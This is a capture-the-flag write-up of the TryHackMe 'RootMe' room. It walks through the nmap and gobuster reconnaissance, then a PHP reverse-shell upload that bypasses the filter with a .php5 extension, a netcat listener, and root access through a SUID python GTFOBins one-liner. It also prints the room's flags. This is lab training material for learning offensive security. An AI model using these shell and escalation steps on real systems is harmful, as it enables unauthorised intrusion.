---
title: "[CTF] Tryhackme - RootMe "
date: 2024-09-16 12:00:00 -500 
categories: [CTF - Tryhackme, RootMe]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Basic Pentesting](https://tryhackme.com/r/room/rrootmet)

# Tasks

- Reconnaissance
- Getting a shell
- Privilege escalation


## Reconnaissance

Questions:
1. Scan the machine, how many ports are open?
2. What version of Apache is running?
3. What service is running on port 22?
4. Find directories on the web server using the GoBuster tool.
5. What is the hidden directory?



### Scan the machine, how many ports are open?

We scan the target with `nmap` and the flag `-sV` and `-sC`:
```bash
nmap -sV -sC $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 17:11 CST
Nmap scan report for 10.10.212.155
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.02 seconds
```

Looks like we have `2`ports open.

Answer: `2`

### What version of Apache is running?

The answer is already in our previous `nmap` scan:

Anser:  `2.4.29`


### What service is running on port 22?

Also in our `nmap`scan:

Answer: `ssh`

### Find directories on the web server using the GoBuster tool &  What is the hidden directory?

We use `gobuster` with a common wordlist:

```bash
└─$ gobuster -w common.txt dir -u $ip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.212.155
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 312] [--> http://10.10.212.155/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.212.155/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.212.155/panel/]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.212.155/uploads/]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================

```
Interesting are `/panel` and `/uploads`. After checking both directories, it is clear that the answer has to be `/panel` because we can upload files here.

Answer: `/panel/`



## Getting a shell

Question: 
1. Find a form to upload and get a reverse shell, and find the flag.

### Find a form to upload and get a reverse shell, and find the flag.

Okay, we can upload things on a webpage - that means we should try to use a `php-reverse-shell`.

I take the reverse-shell from `pentestmonkey`.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

We have to change the IP address and the port in the script.

```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Unfortunately we get an error if we upload a `.php` file, so need another file extension. After testing several extentions `.php5` worked!

While we are uploading our reverse script file we have to listen with `nc` on the port we adjusted earlier. In my case I always use `port 4444`.
After uploading our file and our listener is started we need to "activate" the file. 
In `/uploads/` we can find our script and open it there. After that the connection should be established:

```bash 
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.24.27] from (UNKNOWN) [10.10.212.155] 54486
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:32:16 up 25 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
```

Perfect, now lets `find` our flag:

```bash
$ find / -name user.txt 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
$
```

We got our flag:

Answer: `THM{y0u_g0t_a_sh3ll}`


## Privilege escalation
Questions:
1. Search for files with SUID permission, which file is weird?
2. Find a form to escalate your privileges.
3. root.txt



### Search for files with SUID permission, which file is weird?

Lets search for files with `SUID`permission. We can do that with `find` and flag `-perm`.

```bash
$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

After checking all files, it is strange, that `/usr/bin/python` has a `SUID`permission.

```bash
$ ls -l /usr/bin/python
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
```

Answer: `usr/bin/python`

### Find a form to escalate your privileges.

For this we check the hint there.

`Search for gtfobins`

After a short google search I found this:

https://gtfobins.github.io/gtfobins/python/



    SUID
    If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

    This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    sudo install -m =xs $(which python) .

    ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'


Good. Lets try it.
```bash
$ bash -i
bash: cannot set terminal process group (909): Inappropriate ioctl for device
bash: no job control in this shell
www-data@rootme:/$ usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root
ls
root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}


```

We found the flag in `root.txt`. 

Anser: `THM{pr1v1l3g3_3sc4l4t10n}`


## Thoughts:
This CTF is really good, it starts very simple and getting more interesting. I generally like `reverse shells`, and it is a good practice.
What did we learn?
- using `nmap` for scan open ports and versions
- using `gobuster` for search for hidden directories
- using `php reverse shell` together with `netcat`
- exploit a wrong set `SUID` bit


